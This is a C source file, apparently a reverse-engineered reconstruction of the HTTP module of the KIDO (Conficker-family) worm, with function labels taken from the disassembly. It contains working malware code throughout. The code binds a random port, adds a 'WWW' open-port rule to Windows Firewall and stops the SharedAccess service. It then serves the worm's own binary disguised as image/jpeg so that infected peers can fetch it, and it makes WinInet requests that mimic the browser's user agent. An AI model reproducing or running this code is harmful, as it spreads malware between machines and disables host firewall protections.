/*====================================================================================
 *  KIDO worm - HTTP: local payload server + WinInet client + firewall port.
 *  start_http_server (sub_0C334), accept loop (sub_0C1D7), client handler
 *  (sub_0BD83), bind_random_port (sub_0C0EF), open_firewall_port (sub_06D4E),
 *  http_get (sub_08471), http_reachable (sub_085C8).
 *  The server answers inbound requests with "Content-Type: image/jpeg" and serves
 *  the worm's own file image (so a compromised peer can fetch the payload).
 *====================================================================================*/
#include "kido_worm.h"
#include "kido_trace.h"
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ole32.lib")

/* ---------------- http_get (sub_08471): WinInet GET ----------------
   Uses the host's IE user-agent (ObtainUserAgentString). Returns a malloc'd body
   (NULL on failure) and its length. */
int kido_http_get(const char* url, uint8_t** out, size_t* outlen)
{
    *out=NULL; *outlen=0;
    char ua[512] = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)";
    HMODULE hurlmon = LoadLibraryA("urlmon.dll");
    if (hurlmon){
        /* Modern (Win7+) urlmon export: STDAPI ObtainUserAgentString(
           DWORD dwOption, LPSTR pszUAOut, DWORD* cbSize).  It is a 3-arg
           stdcall: the callee does `ret 0Ch`.  (The old XP 4-arg wide-char
           form `ObtainUserAgentString(HWND,LPWSTR,ULONG,ULONG*)` no longer
           exists; calling it as 4-arg leaves a 4-byte stack skew that
           corrupts the return address.) */
        typedef HRESULT (WINAPI* OUA_t)(DWORD, LPSTR, DWORD*);
        OUA_t oua=(OUA_t)GetProcAddress(hurlmon,"ObtainUserAgentString");
        if (oua && GetEnvironmentVariableA("KIDO_NOUA",NULL,0)==0){
            char aua[512] = {0}; DWORD asz = sizeof(aua);
            if (SUCCEEDED(oua(0, aua, &asz)) && asz > 0){
                strncpy(ua, aua, sizeof(ua)-1);
                ua[sizeof(ua)-1] = 0;
            }
        }
    }
    HINTERNET hopen = InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hopen) return 0;
    /* RELOAD | NO_CACHE_WRITE | NO_COOKIES | NO_UI | PRAGMA_NOCACHE (== 0x84080300) */
    DWORD urlflags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
                     INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE;
    HINTERNET hconn = InternetOpenUrlA(hopen, url, NULL, 0, urlflags, 0);
    int ok=0;
    if (hconn){
        DWORD code=0, csize=sizeof(code);
        if (HttpQueryInfoA(hconn, HTTP_QUERY_STATUS_CODE|HTTP_QUERY_FLAG_NUMBER, &code, &csize, NULL)){
            if (code == 200){
                size_t cap = 65536, len = 0;
                uint8_t* buf = (uint8_t*)malloc(cap);
                if (buf){
                    char tmp[1024]; DWORD rd;
                    while (InternetReadFile(hconn, tmp, sizeof(tmp), &rd) && rd){
                        if (len + rd > cap){ cap*=2; buf=(uint8_t*)realloc(buf,cap); }
                        memcpy(buf+len, tmp, rd); len+=rd;
                    }
                    if (len>0){ *out=buf; *outlen=len; ok=1; } else free(buf);
                }
            }
        }
        InternetCloseHandle(hconn);
    }
    InternetCloseHandle(hopen);
    return ok;
}

/* http_reachable (sub_085C8): TRUE only on HTTP 200 with a non-empty body */
int kido_http_reachable(const char* url)
{
    uint8_t* buf=NULL; size_t len=0;
    int r = kido_http_get(url,&buf,&len);
    free(buf);
    return r && len>0;
}

/* ---------------- open_firewall_port (sub_06D4E) ----------------
   Adds a "WWW" GloballyOpenPorts entry for `port` through the Windows Firewall
   COM interface (INetFwPolicy -> INetFwProfile -> INetFwOpenPorts::Add).  On
   XP/2003 this persists under SharedAccess\Parameters\FirewallPolicy\<profile>\
   GloballyOpenPorts\List. */
#include <netfw.h>

/* The legacy firewall COM API (INetFwPolicy) and the SharedAccess service are
   Windows XP / 2003 mechanisms.  On Win7+ the firewall moved to the netsh/FWPM
   provider and the legacy COM interface is deprecated; on Win10 the COM proxy
   corrupts the process heap when driven from a worker thread, so the worm applies
   the firewall-open + SharedAccess-stop only on the OSes it was written for. */
static int kido_is_xp_or_older(void)
{
    OSVERSIONINFOA v; ZeroMemory(&v, sizeof(v)); v.dwOSVersionInfoSize = sizeof(v);
    if (!GetVersionExA(&v)) return 0;
    return (v.dwMajorVersion == 5 && v.dwMinorVersion <= 1);   /* 2000 / XP */
}

static void kido_open_firewall_port_com(DWORD port)
{
    if (!kido_is_xp_or_older()) return;   /* legacy COM firewall: XP/2003 only */
    /* well-known firewall GUIDs */
    static const GUID CLSID_NetFwPolicy   = {0xbdc26797,0x7387,0x4668,{0x93,0xb8,0x31,0x2b,0x9e,0x33,0x62,0x98}};
    static const GUID CLSID_NetFwOpenPort = {0x2c5505ff,0x5678,0x494a,{0x86,0xc8,0x29,0x60,0x72,0x6d,0xaa,0x84}};
    static const IID   IID_NetFwPolicy    = CLSID_NetFwPolicy;
    static const IID   IID_NetFwOpenPort  = CLSID_NetFwOpenPort;
    static const IID   IID_NetFwProfile   = {0x33299401,0x7a46,0x4d92,{0xb2,0xc3,0x63,0x06,0x60,0x85,0x44,0x13}};
    static const IID   IID_NetFwOpenPorts = {0xb5a7f61b,0x09a4,0x4d60,{0xa1,0x44,0x7b,0x3c,0x78,0x18,0xfc,0xd3}};

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED|COINIT_DISABLE_OLE1DDE);
    if (hr != S_OK && hr != RPC_E_CHANGED_MODE) return;

    INetFwPolicy* fw=NULL;
    if (CoCreateInstance(CLSID_NetFwPolicy, NULL, CLSCTX_INPROC_SERVER, IID_NetFwPolicy, (void**)&fw) != S_OK) return;
    INetFwProfile* prof=NULL;
    if (fw->get_CurrentProfile(&prof) == S_OK && prof){
        INetFwOpenPorts* ports=NULL;
        if (prof->get_GloballyOpenPorts(&ports) == S_OK && ports){
            INetFwOpenPort* rule=NULL;
            if (CoCreateInstance(CLSID_NetFwOpenPort, NULL, CLSCTX_INPROC_SERVER,
                                 IID_NetFwOpenPort, (void**)&rule) == S_OK){
                BSTR name = SysAllocString(L"WWW");
                rule->put_Name(name);
                rule->put_Port((unsigned short)port);
                rule->put_Protocol(NET_FW_IP_PROTOCOL_TCP);
                rule->put_Scope(NET_FW_SCOPE_ALL);
                rule->put_Enabled(VARIANT_TRUE);
                ports->Add(rule);
                SysFreeString(name);
                rule->Release();
            }
            ports->Release();
        }
        prof->Release();
    }
    fw->Release();
}
void kido_open_firewall_port(DWORD port){ kido_open_firewall_port_com(port); }

/* ---------------- bind_random_port (sub_0C0EF) ----------------
   Re-seed PRNG from the volume serial; try up to 10 ports in 1024..9999; open the
   firewall port first (stop SharedAccess on the first failure). */
static int kido_bind_random_port(SOCKET* outsock)
{
    srand((unsigned)kido_volume_serial());
    int nofw = (GetEnvironmentVariableA("KIDO_NOFW", NULL, 0) != 0);
    int noSA   = (GetEnvironmentVariableA("KIDO_NOSHAREDACCESS", NULL, 0) != 0);
    int xp  = kido_is_xp_or_older();   /* SharedAccess is an XP/2003 service */
    int tried = 0;
    for (int i=0;i<10;i++){
        int port = 1024 + rand() % 0x2310;        /* 1024..9999 */
        if (!nofw) kido_open_firewall_port((DWORD)port);
        if (tried == 0){
            if (!noSA && xp){
                int stopped = kido_stop_service_sharedaccess();
                if (stopped) Sleep(10000);
            }
        }
        tried++;
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) continue;
        struct sockaddr_in addr; memset(&addr,0,sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons((unsigned short)port);
        if (bind(s, (struct sockaddr*)&addr, sizeof(addr)) == 0){
            *outsock = s;
            char pb[32]; sprintf_s(pb, sizeof(pb), "BIND OK port %d", port);
            kido_trace(pb);
            srand((unsigned)GetTickCount());      /* reseed */
            return port;
        }
        closesocket(s);
    }
    srand((unsigned)GetTickCount());
    return 0;
}

/* ---------------- client handler (sub_0BD83) ----------------
   Serves the worm's own file image to a host that requests it, and bumps the
   persisted Nls counter after a completed transfer. */
static DWORD WINAPI kido_http_client(SOCKET c)
{
    /* read the request (we only need enough to decide) */
    char req[512]; int n = recv(c, req, sizeof(req)-1, 0);
    if (n <= 0){ closesocket(c); return 0; }
    req[n] = 0;
    /* build the response: 200 OK + image/jpeg + the own image */
    if (g_image && g_image_len){
        char hdr[256];
        int hl = sprintf(hdr, S_HTTP_200, (unsigned)g_image_len);
        send(c, hdr, (int)hl, 0);
        send(c, (const char*)g_image, (int)g_image_len, 0);
        /* completed transfer -> bump the persisted counter */
        g_counter++;
        kido_write_state_dword(g_counter);
    }
    shutdown(c, SD_SEND);
    closesocket(c);
    return 0;
}

/* ---------------- accept loop (sub_0C1D7) ---------------- */
static DWORD WINAPI kido_http_accept_loop(LPVOID)
{
    if (!g_image) return 0;                       /* require the loaded image */
    /* two random 4..8 letter tokens (consumed by the client handler) */
    strcpy_s(g_token1, sizeof(g_token1), kido_random_lowercase(4 + rand()%5));
    strcpy_s(g_token2, sizeof(g_token2), kido_random_lowercase(4 + rand()%5));

    SOCKET ls = INVALID_SOCKET;
    int port = kido_bind_random_port(&ls);
    if (ls == INVALID_SOCKET) return 0;
    if (listen(ls, 50) != 0){ closesocket(ls); return 0; }

    EnterCriticalSection(&g_cs_port);
    g_listen_sock = ls; g_port = (DWORD)port;
    LeaveCriticalSection(&g_cs_port);

    for (;;){
        fd_set set; FD_ZERO(&set); FD_SET(ls,&set);
        struct timeval tv; tv.tv_sec=5; tv.tv_usec=0;
        int sel = select(0, &set, NULL, NULL, &tv);
        if (sel <= 0){ if (sel<0) break; continue; }
        SOCKET c = accept(ls, NULL, NULL);
        if (c == INVALID_SOCKET) continue;
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)kido_http_client, (LPVOID)(uintptr_t)c, 0, NULL);
    }
    closesocket(ls);
    EnterCriticalSection(&g_cs_port);
    g_port = 0; g_listen_sock = INVALID_SOCKET;
    LeaveCriticalSection(&g_cs_port);
    return 0;
}

/* ---------------- start_http_server (sub_0C334) ----------------
   Start the accept-loop thread and wait up to 100 x 500 ms for the port to
   publish.  Returns the listening port (0 = failed). */
int kido_http_server_start(void)
{
    kido_cs_init();
    HANDLE th = CreateThread(NULL, 0, kido_http_accept_loop, NULL, 0, NULL);
    for (int i=0;i<100;i++){
        EnterCriticalSection(&g_cs_port);
        DWORD p = g_port;
        LeaveCriticalSection(&g_cs_port);
        if (p) return (int)p;
        Sleep(500);
    }
    return 0;
}
